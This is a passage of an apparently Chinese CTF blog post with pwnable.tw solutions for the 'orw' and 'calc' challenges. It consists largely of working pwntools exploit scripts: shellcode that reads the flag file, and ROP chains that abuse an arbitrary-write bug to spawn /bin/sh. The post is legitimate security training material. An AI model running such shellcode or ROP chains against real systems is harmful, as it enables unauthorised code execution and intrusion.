+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char *file=&quot;/home/orw/flag&quot;</span><br><span class="line">sys_open(file,0,0)</span><br><span class="line">sys_read(3,file,0x30)</span><br><span class="line">sys_write(1,file,0x30)</span><br></pre></td></tr></table></figure>
+<p>exp1:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;chall.pwnable.tw&quot;, 10001)</span><br><span class="line"></span><br><span class="line"># read -&gt; open -&gt; read -&gt; write</span><br><span class="line">shellcode = &apos;&apos;&apos;</span><br><span class="line">mov eax, 0x03</span><br><span class="line">xor ebx, ebx</span><br><span class="line">mov ecx, esp</span><br><span class="line">mov edx, 0x10</span><br><span class="line">int 0x80</span><br><span class="line"></span><br><span class="line">mov eax, 0x05</span><br><span class="line">mov ebx, esp</span><br><span class="line">xor ecx, ecx</span><br><span class="line">xor edx, edx</span><br><span class="line">int 0x80</span><br><span class="line"></span><br><span class="line">mov ebx, eax </span><br><span class="line">mov eax, 0x03</span><br><span class="line">mov ecx, esp</span><br><span class="line">mov edx, 0x30</span><br><span class="line">int 0x80</span><br><span class="line"></span><br><span class="line">mov eax, 0x04</span><br><span class="line">mov ebx, 1</span><br><span class="line">mov ecx, esp</span><br><span class="line">mov edx, 0x30</span><br><span class="line">int 0x80</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line">p.send(&quot;/home/orw/flag&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>exp2:</p>
+<p>HITCON-Training:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellcode = sc.pushstr(&quot;/home/m4x/HITCON-Training/LAB/lab2/testFlag&quot;)</span><br><span class="line">shellcode += sc.open(&quot;esp&quot;)</span><br><span class="line">#  open返回的文件文件描述符存贮在eax寄存器里 </span><br><span class="line">shellcode += sc.read(&quot;eax&quot;, &quot;esp&quot;, 0x100)</span><br><span class="line">#  open读取的内容放在栈顶 </span><br><span class="line">shellcode += sc.write(1, &quot;esp&quot;, 0x100)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line">context(arch=&apos;i386&apos;, os=&apos;linux&apos;)</span><br><span class="line"></span><br><span class="line">io = remote(&quot;chall.pwnable.tw&quot;, 10001)</span><br><span class="line">io.recvuntil(&quot;shellcode:&quot;)</span><br><span class="line">shellcode = &apos;&apos;</span><br><span class="line">shellcode += shellcraft.open(&quot;/home/orw/flag&quot;)</span><br><span class="line">shellcode += shellcraft.read(&quot;eax&quot;, &quot;esp&quot;, 100) </span><br><span class="line">shellcode += shellcraft.write(1, &apos;esp&apos;, 100)</span><br><span class="line">io.send(asm(shellcode))</span><br><span class="line">print io.interactive()</span><br></pre></td></tr></table></figure>
+<p>exp3:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">from pwn  import *</span><br><span class="line"></span><br><span class="line">file_name=&quot;./orw&quot;</span><br><span class="line">context(log_level = &apos;debug&apos;, arch = &apos;i386&apos;, os = &apos;linux&apos;)</span><br><span class="line">#p=process(file_name)#本地</span><br><span class="line">p=remote(&apos;chall.pwnable.tw&apos;,10001)#远程</span><br><span class="line">#shellcode=asm(shellcraft.sh())</span><br><span class="line">shellcode=&quot;&quot;</span><br><span class="line">shellcode += asm(&apos;xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; push 0x2f77726f; push 0x2f656d6f; push 0x682f2f2f; mov ebx,esp;xor edx,edx;int 0x80;&apos;)</span><br><span class="line">#open(file,0,0)</span><br><span class="line">shellcode += asm(&apos;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;&apos;)</span><br><span class="line">#read(3,file,0x30)</span><br><span class="line">shellcode += asm(&apos;mov eax,0x4;mov bl,0x1;int 0x80;&apos;)</span><br><span class="line">#write(1,file,0x30)</span><br><span class="line">def pwn():</span><br><span class="line">    recv = p.recvuntil(&apos;:&apos;)</span><br><span class="line">    p.sendline(shellcode)</span><br><span class="line">    flag = p.recv(100)</span><br><span class="line">    print flag</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
+<p>exp4:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line">from keystone import *</span><br><span class="line">context(os=&apos;linux&apos;, arch=&apos;i386&apos;, log_level=&apos;debug&apos;)</span><br><span class="line"></span><br><span class="line">GDB = 1</span><br><span class="line">if len(sys.argv) &gt; 2:</span><br><span class="line">    p = remote(sys.argv[1], int(sys.argv[2]))</span><br><span class="line">else:</span><br><span class="line">    p = process(&quot;./orw&quot;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    if GDB:</span><br><span class="line">        raw_input()</span><br><span class="line">    ks = Ks(KS_ARCH_X86, KS_MODE_32)</span><br><span class="line">    shellcode = &quot;&quot;&quot;</span><br><span class="line">    mov eax, 3</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov ecx, 0x0804a000</span><br><span class="line">    mov edx, 0x10</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    mov eax, 5</span><br><span class="line">    mov ebx, 0x804a000</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    xor edx, edx</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    mov ebx, eax</span><br><span class="line">    mov eax, 3</span><br><span class="line">    mov ecx, 0x804a000</span><br><span class="line">    mov edx, 0x40</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    mov eax, 4</span><br><span class="line">    mov ebx, 1</span><br><span class="line">    mov ecx, 0x804a000</span><br><span class="line">    mov edx, 0x40</span><br><span class="line">    int 0x80</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        encoding, count = ks.asm(shellcode)</span><br><span class="line">        print(&apos;count &#123;&#125;&apos;.format(count))</span><br><span class="line">    except KsError as e:</span><br><span class="line">        print(&quot;Error: &#123;&#125;&quot;.format(e))</span><br><span class="line">    p.recvuntil(&apos;shellcode:&apos;)</span><br><span class="line">    p.send(&apos;&apos;.join(map(chr, encoding)))</span><br><span class="line"></span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(&apos;/home/orw/flag\x00&apos;)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h1 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h1><p>32位:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eax=11</span><br><span class="line">ebx=“/bin/sh”字符串的地址</span><br><span class="line">ecx=0</span><br><span class="line">edx=0</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+<p>64位:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rax=0x3b</span><br><span class="line">rdi=&quot;/bin/sh&quot;字符串地址</span><br><span class="line">rsi=0</span><br><span class="line">rdx=0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p>示例: <a href="http://eternalsakura13.com/2018/04/27/star_primepwn/" rel="external nofollow" target="_blank">http://eternalsakura13.com/2018/04/27/star_primepwn/</a></p>
+<p>首先定义一个struct:</p>
+<p><img src="/assets/pwnabletw/TIM截图20181203173044.png" alt=""></p>
+<p>然后倒入数据结构：</p>
+<p><img src="/assets/pwnabletw/TIM截图20181203173225.png" alt=""></p>
+<p>逻辑漏洞:当输入表达式第一位就是符号的时候，就会修改buff-&gt;buff_size, 由于buf-&gt;buff_size可以被控制，所以执行eval的时候，会造成任意地址写。</p>
+<p><img src="/assets/pwnabletw/TIM截图20181203173256.png" alt=""></p>
+<h2 id="rop不需要leak"><a href="#rop不需要leak" class="headerlink" title="rop不需要leak"></a>rop不需要leak</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">debug = int(raw_input(&quot;debug?:&quot;))</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    p = process(&quot;./calc&quot;)</span><br><span class="line">    context.log_level = &quot;debug&quot;</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;chall.pwnable.tw&quot;, 10100)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_val(value):</span><br><span class="line">    value = int(value)</span><br><span class="line">    if value &lt; 0:</span><br><span class="line">        return value &amp; 0xffffffff</span><br><span class="line">    else:</span><br><span class="line">        return value</span><br><span class="line"></span><br><span class="line">current_val = &#123;&#125;</span><br><span class="line"></span><br><span class="line">def write(addr, content):</span><br><span class="line">    p.sendline(&quot;+&quot; + str(addr))</span><br><span class="line">    current_val = get_val(p.recvline()[:-1])</span><br><span class="line">    p.info(&apos;current &#123;&#125; = &#123;&#125;&apos;.format(addr, hex(current_val)))</span><br><span class="line">    </span><br><span class="line">    payload = &quot;+&quot; + str(addr)</span><br><span class="line">    val = content - current_val</span><br><span class="line">    if addr == 363:</span><br><span class="line">        print val</span><br><span class="line">    if val &lt; 0:</span><br><span class="line">        payload += &apos;-&apos; + str(abs(val))</span><br><span class="line">    elif val &gt; 0x7fffffff:</span><br><span class="line">        payload += &apos;-&apos; + str(0xffffffff - val + 1)</span><br><span class="line">    else:</span><br><span class="line">        payload += &apos;+&apos; + str(val)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    received = get_val(p.recvline()[:-1])</span><br><span class="line">    if received != content:</span><br><span class="line">        p.info(&apos;not right!&apos;)</span><br><span class="line">        raise Exception(&apos;not successful&apos;)</span><br><span class="line"></span><br><span class="line"># 361 ret_addr </span><br><span class="line">p.recvuntil(&quot;===\n&quot;)</span><br><span class="line"></span><br><span class="line">rop = [</span><br><span class="line">  0x080701aa, # pop edx ; ret</span><br><span class="line">  0x080ec060, # @ .data</span><br><span class="line">  0x0805c34b, # pop eax ; ret</span><br><span class="line">  u32(&apos;/bin&apos;),</span><br><span class="line">  0x0809b30d, # mov dword ptr [edx], eax ; ret</span><br><span class="line">  0x080701aa, # pop edx ; ret</span><br><span class="line">  0x080ec064, # @ .data + 4</span><br><span class="line">  0x0805c34b, # pop eax ; ret</span><br><span class="line">  u32(&apos;/sh\x00&apos;),</span><br><span class="line">  0x0809b30d, # mov dword ptr [edx], eax ; ret</span><br><span class="line">  0x080701aa, # pop edx ; ret</span><br><span class="line">  0x080ec068, # @ .data + 8                    # edx = 0</span><br><span class="line">  0x080550d0, # xor eax, eax ; ret</span><br><span class="line">  0x0809b30d, # mov dword ptr [edx], eax ; ret # @.data+8 = 0 </span><br><span class="line">  0x080701d1, # pop ecx ; pop ebx ; ret        # ecx = 0, ebx= &apos;/bin/sh&apos; address</span><br><span class="line">  0x080ec068, # @ .data + 8</span><br><span class="line">  0x080ec060, # @ .data</span><br><span class="line">  0x0805c34b, # pop eax ; ret            # eax = 0xb</span><br><span class="line">  0xb,</span><br><span class="line">  0x08049a21 # int 0x80</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">index = 361</span><br><span class="line">for i in rop:</span><br><span class="line">    write(index, i)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line">p.sendline(&quot;end&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="rop需要leak"><a href="#rop需要leak" class="headerlink" title="rop需要leak"></a>rop需要leak</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">debug = int(raw_input(&quot;debug?:&quot;))</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    p = process(&quot;./calc&quot;)</span><br><span class="line">    context.log_level = &quot;debug&quot;</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;chall.pwnable.tw&quot;, 10100)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_val(value):</span><br><span class="line">    value = int(value)</span><br><span class="line">    if value &lt; 0:</span><br><span class="line">        return value &amp; 0xffffffff</span><br><span class="line">    else:</span><br><span class="line">        return value</span><br><span class="line"></span><br><span class="line">current_val = &#123;&#125;</span><br><span class="line"></span><br><span class="line">def write(addr, content):</span><br><span class="line">    p.sendline(&quot;+&quot; + str(addr))</span><br><span class="line">    current_val = get_val(p.recvline()[:-1])</span><br><span class="line">    p.info(&apos;current &#123;&#125; = &#123;&#125;&apos;.format(addr, hex(current_val)))</span><br><span class="line">    </span><br><span class="line">    payload = &quot;+&quot; + str(addr)</span><br><span class="line">    val = content - current_val</span><br><span class="line">    if addr == 363:</span><br><span class="line">        print val</span><br><span class="line">    if val &lt; 0:</span><br><span class="line">        payload += &apos;-&apos; + str(abs(val))</span><br><span class="line">    elif val &gt; 0x7fffffff:</span><br><span class="line">        payload += &apos;-&apos; + str(0xffffffff - val + 1)</span><br><span class="line">    else:</span><br><span class="line">        payload += &apos;+&apos; + str(val)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    received = get_val(p.recvline()[:-1])</span><br><span class="line">    if received != content:</span><br><span class="line">        p.info(&apos;not right!&apos;)</span><br><span class="line">        raise Exception(&apos;not successful&apos;)</span><br><span class="line"></span><br><span class="line"># 360 ebp</span><br><span class="line"># 361 ret_addr </span><br><span class="line">p.recvuntil(&quot;===\n&quot;)</span><br><span class="line"></span><br><span class="line">#leak stack</span><br><span class="line">p.sendline(&quot;+360&quot;)</span><br><span class="line">stack_leak = get_val(p.recvline()[:-1])</span><br><span class="line">start_pos = stack_leak - 0x20</span><br><span class="line">p.info(&apos;current &#123;&#125; = &#123;&#125;&apos;.format(360, hex(start_pos)))</span><br><span class="line"></span><br><span class="line"># +361 -&gt; return_address</span><br><span class="line"># stack:</span><br><span class="line"># 360 =&gt; start_pos(leaked)</span><br><span class="line"># 361 =&gt; 0x080701d1 : pop ecx ; pop ebx ; ret</span><br><span class="line"># 362 =&gt; 0</span><br><span class="line"># 363 =&gt; ebx : start_pos + 36</span><br><span class="line"># 364 =&gt; 0x0805c34b : pop eax ; ret</span><br><span class="line"># 365 =&gt; eax : 0xb</span><br><span class="line"># 366 =&gt; 0x080701aa : pop edx ; ret</span><br><span class="line"># 367 =&gt; 0</span><br><span class="line"># 368 =&gt; 0x08049a21 : int 0x80</span><br><span class="line"># 369 =&gt; 0x6e69622f /bin/sh\x00</span><br><span class="line"># 370 =&gt; 0x68732f</span><br><span class="line"></span><br><span class="line">write(361, 0x080701d1)</span><br><span class="line">#write(362, start_pos + 36)</span><br><span class="line">write(362, 0)</span><br><span class="line">write(363, start_pos + 36)</span><br><span class="line">write(364, 0x0805c34b)</span><br><span class="line">write(365, 0xb)</span><br><span class="line">write(366, 0x080701aa)</span><br><span class="line">write(367, 0x0)</span><br><span class="line">write(368, 0x08049a21)</span><br><span class="line">write(369, 0x6e69622f)</span><br><span class="line">write(370, 0x68732f)</span><br><span class="line"></span><br><span class="line">p.sendline(&quot;end&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://www.tiandiwuji.top">Tianji</a>
+            </p><p>原文链接: <a href="https://www.tiandiwuji.top/posts/4968/">https://www.tiandiwuji.top/posts/4968/</a>
+            </p><p>发表日期: <a href="https://www.tiandiwuji.top/posts/4968/">December 1st 2018, 5:50:59 pm</a>
+            </p><p>版权声明: 本文采用<a rel="external nofollow" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/posts/41159/" title="RealWorldFinal">
+                    <div class="nextTitle">RealWorldFinal</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/posts/48844/" title="bctf2018">
+                    <div class="prevTitle">bctf2018</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid="MTAyMC8zODcyNS8xNTI1Mw==">
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:fengyunhetao@gmail.com" class="iconfont-archer email" title="email" rel="external nofollow" target="_blank"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fengyuhetao" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="external nofollow">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style="top:50vh;">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#start"><span class="toc-number">1.</span> <span class="toc-text">start</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#orw"><span class="toc-number">2.</span> <span class="toc-text">orw</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#calc"><span class="toc-number">3.</span> <span class="toc-text">calc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#rop不需要leak"><span class="toc-number">3.1.</span> <span class="toc-text">rop不需要leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rop需要leak"><span class="toc-number">3.2.</span> <span class="toc-text">rop需要leak</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
